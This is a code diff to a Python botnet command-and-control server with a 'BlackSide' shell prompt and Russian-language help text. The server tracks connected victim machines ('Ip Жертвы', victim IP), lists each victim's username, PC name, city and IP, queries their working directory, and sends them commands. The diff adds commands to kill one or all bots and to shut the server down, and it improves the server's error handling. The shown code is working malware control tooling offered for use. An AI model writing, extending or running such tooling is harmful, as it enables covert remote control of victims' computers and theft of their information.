@@ -26,7 +26,7 @@ def connect(server, conns):
             conns.append(conn)
     except:
         time.sleep(0.5)
-        print('[-] Ошибка! Попробуйте позже ')     
+        exit()     
 
 if __name__ == "__main__":
     cls()
@@ -40,7 +40,8 @@ if __name__ == "__main__":
  
     threading.Thread(target=connect, args=(server, conns)).start()
     def cmds():
-     while True:          
+     while True:
+      try:             
         command = input(f'{Fore.LIGHTWHITE_EX}{os.getlogin()}@BlackSide: ~#{Fore.LIGHTMAGENTA_EX} ') 
         try:
              for conn in conns:   
@@ -61,6 +62,8 @@ if __name__ == "__main__":
             helpcomm.add_row(['Info', 'Информация о ПК', 'Info [Ip Жертвы]'])
             helpcomm.add_row(['Bots', 'Информация о подключенных девайсах', 'Bots'])
             helpcomm.add_row(['Clear', 'Очищает консоль', 'Clear'])
+            helpcomm.add_row(['Exit', 'Выключает сервер', 'Exit'])
+            helpcomm.add_row(['Kill', 'Удаляет бота', 'Kill [Ip Жертвы/all]'])
             print(helpcomm)
  
  
@@ -314,14 +317,40 @@ if __name__ == "__main__":
             if int(len(iparg)) < 3:
                 print('[-] Укажите IP')
                 return cmds()
-            if conn.getpeername()[0] == iparg:
-                for conn in conns:
+            for conn in conns:
+                if conn.getpeername()[0] == iparg:
                     try:
                         conn.send(str.encode('cwd'))
                         print(str(conn.recv(4096), 'utf-8'))
                     except:
                         pass   
 
+        elif command.startswith('kill') or command.startswith('Kill'):
+            iparg = command[5:]
+            if int(len(iparg)) < 3:
+                print('[-] Укажите IP')
+                return cmds()
+            if iparg == 'all' or iparg == 'All':
+                for conn in conns:
+                    try:
+                        conn.send(str.encode('kill'))
+                    except:
+                        pass 
+            else:    
+             for conn in conns:
+                if conn.getpeername()[0] == iparg:
+                    try:
+                        conn.send(str.encode('kill'))
+                        print(str(conn.recv(4096), 'utf-8'))
+                    except:
+                        pass   
+            print('[+] Команда отправлена')         
+
+        elif command == 'exit' or command == 'Exit':
+            print('Bye...')
+            time.sleep(0.3)
+            server.close()
+            quit()
         elif command == 'bots':
             try:
              botslist = PrettyTable([ 'Username','PC Name', 'City', 'IP'])
@@ -331,9 +360,15 @@ if __name__ == "__main__":
                   usern = str(conn.recv(1024), 'utf-8')
                   pcname = str(conn.recv(1024), 'utf-8')
                   city = str(conn.recv(1024), 'utf-8')
-                 except:
+                  ipaddr = str(conn.getpeername()[0])
+                 except Exception as e:       
                      pass
-                 ipaddr = str(conn.getpeername()[0])
+                     usern = 'Error'
+                     pcname = 'Error'
+                     city = 'Error'
+                     ipaddr = 'Error'
+                     conns.remove(conn)
+                    
                  botslist.add_row([ usern , pcname, city ,ipaddr ])
              print('Количество ботов: ' + str(len(conns)))
              print(botslist)                   
@@ -341,4 +376,6 @@ if __name__ == "__main__":
                 print(f'Вознилка ошибка: {e}')
         else:
             print('[-] Такой команды не существует, напишите "help"')
+      except KeyboardInterrupt:
+          print('[-] KeyboardInterrupt')           
     cmds()
